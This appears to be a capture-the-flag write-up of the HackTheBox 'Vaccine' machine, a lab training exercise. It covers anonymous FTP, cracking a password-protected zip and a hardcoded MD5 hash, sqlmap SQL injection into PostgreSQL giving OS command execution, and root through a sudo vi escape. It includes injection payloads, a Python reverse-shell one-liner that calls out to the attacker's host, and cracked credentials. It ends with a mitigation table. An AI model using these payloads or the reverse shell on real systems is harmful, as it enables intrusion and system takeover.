# Vaccine — HackTheBox

**Platform:** HackTheBox
**Machine:** Vaccine
**Difficulty:** Easy
**OS:** Linux
**Date:** 24/07/2026
**Tags:** #enum #foothold #privesc #ftp #sqlinjection
**Status:** Retired ✅

## TL;DR

Initial access starts with an **FTP server allowing anonymous login**, from which a password-protected `backup.zip` can be downloaded. The zip's password is cracked offline with **John the Ripper**, revealing the login panel's source code (`index.php`), which contains a **hardcoded MD5 hash** of the `admin` user's password. That hash is cracked in seconds via CrackStation, enabling a legitimate login to the admin panel.

Inside the panel, the `search` parameter on `dashboard.php` is vulnerable to **SQL Injection** (PostgreSQL backend). `sqlmap` identifies multiple injection types (boolean-based, error-based, stacked queries, time-based) and, leveraging PostgreSQL's stacked-query capability, obtains an `os-shell` via `COPY ... FROM PROGRAM ...`. That semi-interactive shell is then used to launch a full reverse shell, capturing the first flag (`user.txt`).

For privilege escalation, a plaintext password is found inside `/var/www/html/dashboard.php`, enabling SSH login as the `postgres` user. `sudo -l` reveals permission to run `vi` as root against a PostgreSQL configuration file — a classic editor-escape case documented on GTFOBins, resulting in an interactive root shell and the second flag (`root.txt`).

**Attack chain:** Anonymous FTP → backup.zip (password cracked with John) → hardcoded MD5 hash in index.php (cracked via CrackStation) → admin login → SQL Injection (PostgreSQL) → os-shell via sqlmap → reverse shell → plaintext credential in dashboard.php → SSH as postgres → sudo on `vi` (GTFOBins) → root

---

## 1. Recon

### 1.1 Nmap enumeration

```
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-05 08:06 -0300
Nmap scan report for 10.129.95.174
Host is up (0.16s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.15.203
|      Logged in as ftpuser
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c0:ee:58:07:75:34:b0:0b:91:65:b2:59:56:95:27:a4 (RSA)
|   256 ac:6e:81:18:89:22:d7:a7:41:7d:81:4f:1b:b8:b2:51 (ECDSA)
|_  256 42:5b:c3:21:df:ef:a2:0b:c9:5e:03:42:1d:69:d0:28 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: MegaCorp Login
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.17 seconds
```

Three open ports: **FTP (21)** running `vsftpd 3.0.3` with anonymous login enabled (Nmap's own banner already reveals a `backup.zip` file), **SSH (22)**, and **HTTP (80)** with a login panel ("MegaCorp Login") on Apache 2.4.41. Anonymous FTP immediately stands out as the first vector to exploit.

### 1.2 Directory enumeration with Gobuster

```
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.95.174
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.hta                 (Status: 403) [Size: 278]
.htpasswd            (Status: 403) [Size: 278]
.htaccess            (Status: 403) [Size: 278]
index.php            (Status: 200) [Size: 2312]
server-status        (Status: 403) [Size: 278]
Progress: 4750 / 4750 (100.00%)
```

Only `index.php` stands out as relevant — the web app is small, reinforcing that the initial attack path runs through FTP.

---

## 2. Foothold

### 2.1 Anonymous FTP → backup.zip

```
┌──(gabriel㉿gabriel)-[~]
└─$ ftp anonymous@10.129.95.174
Connected to 10.129.95.174.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||10992|)
150 Here comes the directory listing.
-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
226 Directory send OK.
ftp> 
```

Anonymous login is accepted and exposes `backup.zip`, which is password-protected. Converting the zip to a crackable hash (`zip2john`) and running **John the Ripper** against it cracks the password:

#### 741852963

Extracting the zip with that password yields two files:

- `index.php`
- `style.css`

### 2.2 Hardcoded MD5 hash in the source code

`index.php` contains the panel's authentication logic right at the top — and it exposes a fixed MD5 hash compared against the submitted password:

```php
<!DOCTYPE html>
<?php
session_start();
  if(isset($_POST['username']) && isset($_POST['password'])) {
    if($_POST['username'] === 'admin' && md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3") {
      $_SESSION['login'] = "true";
      header("Location: dashboard.php");
    }
  }
```

> This hash (`2cb42f8734ea607eefed3b70af13bbd3`) is technical evidence from the vulnerable source code being analyzed — not a challenge flag — so it is kept unredacted.

Plugging that MD5 into [Crack Station](https://crackstation.net/) reveals the plaintext password for the **admin** user:

#### qwerty789

### 2.3 Admin login and session capture

With those credentials, the admin panel can be accessed. Upon authenticating, the session cookie is also captured:

#### PHPSESSID=kb39m3fva7ng0eaagkacsapgej

### 2.4 SQL Injection in the `search` parameter → os-shell via sqlmap

With an authenticated session in hand, `sqlmap` is used to probe the `search` parameter on `dashboard.php`, aiming to expand access all the way to an interactive shell on the box:

```
sqlmap -u "http://10.129.95.174/dashboard.php?search=test" --cookie="PHPSESSID=kb39m3fva7ng0eaagkacsapgej" -p search --os-shell
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.10.6#stable}
|_ -| . ["]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 08:29:05 /2026-08-05/

[08:29:05] [INFO] resuming back-end DBMS 'postgresql' 
[08:29:05] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: search (GET)
    Type: boolean-based blind
    Title: PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)
    Payload: id=1&search=teste' AND (SELECT (CASE WHEN (6193=6193) THEN NULL ELSE CAST((CHR(85)||CHR(82)||CHR(84)||CHR(72)) AS NUMERIC) END)) IS NULL-- zrij

    Type: error-based
    Title: PostgreSQL AND error-based - WHERE or HAVING clause
    Payload: id=1&search=teste' AND 1340=CAST((CHR(113)||CHR(122)||CHR(112)||CHR(98)||CHR(113))||(SELECT (CASE WHEN (1340=1340) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(118)||CHR(120)||CHR(107)||CHR(113)) AS NUMERIC)-- AJrn

    Type: stacked queries
    Title: PostgreSQL > 8.1 stacked queries (comment)
    Payload: id=1&search=teste';SELECT PG_SLEEP(5)--

    Type: time-based blind
    Title: PostgreSQL > 8.1 AND time-based blind
    Payload: id=1&search=teste' AND 2915=(SELECT 2915 FROM PG_SLEEP(5))-- eqTX
---
[08:29:06] [INFO] the back-end DBMS is PostgreSQL
web server operating system: Linux Ubuntu 20.04 or 20.10 or 19.10 (eoan or focal)
web application technology: Apache 2.4.41
back-end DBMS: PostgreSQL
[08:29:06] [INFO] fingerprinting the back-end DBMS operating system
[08:29:06] [INFO] the back-end DBMS operating system is Linux
[08:29:07] [INFO] testing if current user is DBA
[08:29:07] [WARNING] reflective value(s) found and filtering out
[08:29:07] [INFO] retrieved: '1'
[08:29:07] [INFO] going to use 'COPY ... FROM PROGRAM ...' command execution
[08:29:07] [INFO] calling Linux OS shell. To quit type 'x' or 'q' and press ENTER
os-shell> 
```

The parameter is vulnerable to multiple injection techniques against PostgreSQL (boolean-based, error-based, stacked queries, and time-based blind). Since the database user has DBA privileges, `sqlmap` manages to execute OS commands via `COPY ... FROM PROGRAM ...`, opening an `os-shell`.

### 2.5 From os-shell to a full reverse shell

sqlmap's `os-shell` still operates inside a SQL instance, so the next step is to use it to launch an actual reverse shell:

```bash
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("10.10.15.203",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```

```
┌──(gabriel㉿gabriel)-[~]
└─$ nc -lvnp 4444 
listening on [any] 4444 ...
connect to [10.10.15.203] from (UNKNOWN) [10.129.95.174] 34230
$ whoami
$ ls
base          pg_multixact  pg_stat      PG_VERSION            postmaster.pid
global        pg_notify     pg_stat_tmp  pg_wal
pg_commit_ts  pg_replslot   pg_subtrans  pg_xact
pg_dynshmem   pg_serial     pg_tblspc    postgresql.auto.conf
pg_logical    pg_snapshots  pg_twophase  postmaster.opts
$ cd ..
$ ls
main
$ cd ..
$ ls
11  user.txt
$ cat user.txt  
ec9b13ca...5bf7
$ 
```

Reverse shell received, running with the PostgreSQL service's execution context — already enough to read the first flag.

---

## 3. Privilege escalation

### 3.1 Plaintext credential in the application's source code

Digging through the web application's files, the system `postgres` user's password is found in plaintext inside `/var/www/html/dashboard.php`:

#### P@s5w0rd!

### 3.2 SSH access and `sudo -l`

That credential enables SSH login as `postgres`. Checking sudo permissions:

```
postgres@vaccine:/var/www/html$ sudo -l
[sudo] password for postgres: 
Matching Defaults entries for postgres on vaccine:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR
    XFILESEARCHPATH XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    mail_badpass

User postgres may run the following commands on vaccine:
    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
postgres@vaccine:/var/www/html$ 
```

The `postgres` user can run `vi` as root against a specific PostgreSQL configuration file — a case documented on [GTFOBins (vi)](https://gtfobins.org/gtfobins/vi/), which allows escaping the editor into a shell.

### 3.3 Escaping `vi` → root shell

```
sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

Inside `vi`, opened as root, the `:sh` command escapes to an interactive shell already running with root privileges:

```
root@vaccine:/var/lib/postgresql# whoami
root
root@vaccine:/var/lib/postgresql# sudo visudo
visudo: /etc/sudoers.tmp unchanged
root@vaccine:/var/lib/postgresql# cat /root/root.txt
dd6e058e...5849
root@vaccine:/var/lib/postgresql# 
```

And with that, the final flag is captured as root.

---

## 4. Root cause & mitigation

| # | Vulnerability | Root cause | Mitigation |
|---|---|---|---|
| 1 | Anonymous FTP exposing sensitive file | `vsftpd` configured to accept anonymous login and serve a backup containing application source code | Disable anonymous login on production FTP services; never store code/credential backups in publicly reachable locations |
| 2 | Weak backup password | `backup.zip` protected by a simple numeric password, crackable in seconds with John the Ripper | Use strong, random passwords for protected archives, or preferably managed-key encryption instead of a password-protected zip |
| 3 | Hardcoded credential (MD5 hash) in source code | `index.php` compares the submitted password directly against a fixed MD5 hash embedded in the code | Never hardcode credentials/hashes in source code; authenticate against a user store with strong hashing (bcrypt/argon2) and salting |
| 4 | SQL Injection in the `search` parameter | User input concatenated directly into the SQL query with no parameterization | Use prepared statements / parameterized queries for all database access; apply input validation and allowlisting |
| 5 | Database user with excessive privileges (DBA) | The account used by the application has enough permissions to execute OS commands via `COPY ... FROM PROGRAM ...` | Apply least privilege: the application's database account should not hold superuser/DBA rights or the ability to run external programs |
| 6 | System credential in plaintext in application code | The system `postgres` user's password stored in plaintext in `dashboard.php` | Use environment variables or a secrets manager; never reuse or store system credentials in application code |
| 7 | Dangerous `sudo` rule (GTFOBins) | `postgres` authorized via `sudoers` to run `vi` as root — a text editor with a native shell-escape capability | Avoid granting interactive text editors via sudo; if necessary, use a restricted `sudoedit`/`rvim` or wrapper scripts without access to `:sh`/`!` |

---

## 5. Lessons learned

- Legacy services like FTP with anonymous login remain, in practice, one of the most common sources of initial sensitive-data leaks — always worth checking.
- Weak-password-protected backups are trivial to crack offline; the presence of a `.zip` on an exposed service should always prompt a cracking attempt before dismissing the vector.
- Hardcoded hashes and credentials in source code are a high-value target the moment any file-read access is gained — grepping for hash/password patterns should be an automatic post-exploitation step.
- Database accounts used by web applications should never hold DBA privileges: that exact excess of permission is what let `sqlmap` jump from a simple SQL Injection to OS command execution.
- `sudo` rules that grant text editors (vi, vim, nano, etc.) are almost always exploitable via GTFOBins — reviewing `sudo -l` should be one of the first steps in any local privilege escalation phase.
